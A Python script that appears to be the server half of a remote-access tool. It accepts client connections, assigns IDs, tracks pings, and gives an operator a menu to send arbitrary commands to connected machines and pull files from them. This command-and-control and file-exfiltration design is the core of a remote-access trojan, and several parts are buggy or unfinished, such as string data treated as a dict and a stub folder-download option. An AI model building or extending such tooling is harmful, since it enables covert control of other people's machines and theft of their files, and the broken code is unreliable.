#!/usr/bin/env python3

import socket
import threading
import random
import time
import json

# data structure for communication with the client
# {
#     'client_id': client_id,
#     'hostname': hostname,
#     'socket': new_client_socket,
#     'address': new_client_address,
#     'last_ping': time.time(),
#     'main': False
# }

SERVER_ADDR = '192.168.1.10'
SERVER_PORT = 12345
PING_PORT = 12344

all_connections = []

def handle_client(client_socket):
    # Choose a random port number
    new_port = random.randint(12346, 65535)

    # Listen on the new port
    new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    new_socket.bind((SERVER_ADDR, new_port))
    new_socket.listen(1)
    print(f'Listening on {SERVER_ADDR}:{new_port}')

    # Send the new port number to the client
    client_socket.sendall(str(new_port).encode())

    # Accept a connection on the new port
    new_client_socket, new_client_address = new_socket.accept()
    print(f'Accepted connection from {new_client_address[0]}:{new_client_address[1]}')

    # Forward the connection to the new port
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        new_client_socket.sendall(data)

    # close the old client socket
    client_socket.close()

    # get the hostname from the new client or get the ping
    hostname = new_client_socket.recv(1024)

    # Create a client id and send it to the client
    client_id = random.randint(100000, 999999)
    new_client_socket.sendall(str(client_id).encode())

    # append the new client socket to the list
    all_connections.append({'client_id': client_id, 'hostname': hostname, 'socket': new_client_socket, 'address': new_client_address, 'last_ping': time.time(), 'main': False})

    print(f'Client {client_id} connected')

    # Close the sockets
    # new_client_socket.close()
    # new_socket.close()

def ping_server():
    while True:
        # Create the ping socket
        ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ping_socket.bind((SERVER_ADDR, PING_PORT))
        ping_socket.listen(1)
        # print(f'Listening on {SERVER_ADDR}:{PING_PORT} for pings')

        # Accept a connection
        ping_client_socket, ping_client_address = ping_socket.accept()
        print(f'Accepted connection from {ping_client_address[0]}:{ping_client_address[1]} for pings')

        # Receive the client id from the client
        data = ping_client_socket.recv(1024)
        client_id = int(data.decode())

        print(f'Client {client_id} is alive')

        # Update the last ping time
        for i in range(len(all_connections)):
            if all_connections[i]['client_id'] == client_id:
                all_connections[i]['last_ping'] = time.time()

        # Close the sockets
        ping_client_socket.close()
        ping_socket.close()

def accept_connections(server_socket):
    while True:
        # Accept a connection
        client_socket, client_address = server_socket.accept()
        print(f'Accepted connection from {client_address[0]}:{client_address[1]}')
        # Handle the client in a new thread
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

def send_command(connection):
    # Send the command to the client
    command = input('Enter the command: ')
    connection['socket'].sendall(command.encode())

    # Receive the output from the client
    output = connection['socket'].recv(1024)
    print(output.decode())

def show_menu():
    print('1. Show all connections')
    print('2. Download a file')
    print('3. Download folder')
    a = input('Enter your choice: ')
    if a == '1':
        show_all_connections()
    elif a == '2':
        show_all_connections()
        client_id = input('Enter the client id: ')
        for i in range(len(all_connections)):
            if all_connections[i]['client_id'] == int(client_id):
                download_file(all_connections[i])


def show_all_connections():
    print('ID\tHostname\tAddress\t\tLast Ping')
    print('--\t--------\t-------\t\t---------')
    for i in range(len(all_connections)):
        print(f'{all_connections[i]["client_id"]}\t{all_connections[i]["hostname"].decode()}\t{all_connections[i]["address"][0]}\t{time.time() - all_connections[i]["last_ping"]}')

def download_file(connection):
    # Send the path to the client
    path = input('Enter the path: ')
    connection['socket'].sendall("{instruction: 'download_file', filepath: " + path + "}".encode())
    # Receive the status and the file size from the client
    data = connection['socket'].recv(1024)
    data = data.decode()
    if data['instruction'] == 'ok':
        file_size = data['file_size']
        print(f'Downloading {path} ({file_size} bytes ...)')
        # Receive the file from the client
        with open(f"~/.app/{connection['client_id']}/{path}", 'wb') as f:
            while True:
                data = connection['socket'].recv(1024)
                if not data:
                    break
                f.write(data)
        print(f'Downloaded {path} successfully')
    else:
        print(f'Error: {data["error"]}')

def main():
    # Listen on the original port
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_ADDR, SERVER_PORT))
    server_socket.listen(5)
    print(f'Listening on {SERVER_ADDR}:{SERVER_PORT}')

    # Create ten threads to accept connections
    accept_cnections_thread = threading.Thread(target=accept_connections, args=(server_socket,))
    accept_cnections_thread.start()

    # Create a thread to ping the clients
    ping_server_thread = threading.Thread(target=ping_server)
    ping_server_thread.start()

    # show the menu
    while True:
        show_menu()


if __name__ == '__main__':
    main()


